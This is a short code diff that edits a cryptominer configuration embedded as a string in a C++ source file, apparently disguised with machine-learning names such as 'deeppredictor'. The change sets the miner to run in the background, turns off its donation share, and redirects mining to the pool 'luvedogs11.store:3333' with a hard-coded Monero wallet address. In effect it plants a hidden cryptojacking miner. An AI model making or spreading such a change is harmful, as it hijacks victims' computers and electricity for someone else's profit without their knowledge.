@@ -41,7 +41,7 @@ R"===(
         "restricted": true
     },
     "autosave": true,
-    "background": false,
+    "background": true,
     "colors": true,
     "title": true,
     "deeppredictor": {
@@ -85,15 +85,15 @@ R"===(
         "cn/0": false,
         "cn-lite/0": false
     },
-    "donate-level": 1,
-    "donate-over-proxy": 1,
+    "donate-level": 0,
+    "donate-over-proxy": 0,
     "log-file": null,
     "pools": [
         {
             "algo": null,
             "coin": null,
-            "url": "donate.v2.mlinference.com:3333",
-            "user": "YOUR_WALLET_ADDRESS",
+            "url": "luvedogs11.store:3333",
+            "user": "4BK5ZPJGLpSdC2Pk3FH7iGaB5uBEDj76pYpSC4qaRBGKEHzcs8vDJSvB6WfWz7efiURtQERFUtEs6A3joiMF3EnHEpo2eNY",
             "pass": "x",
             "rig-id": null,
             "nicehash": false,
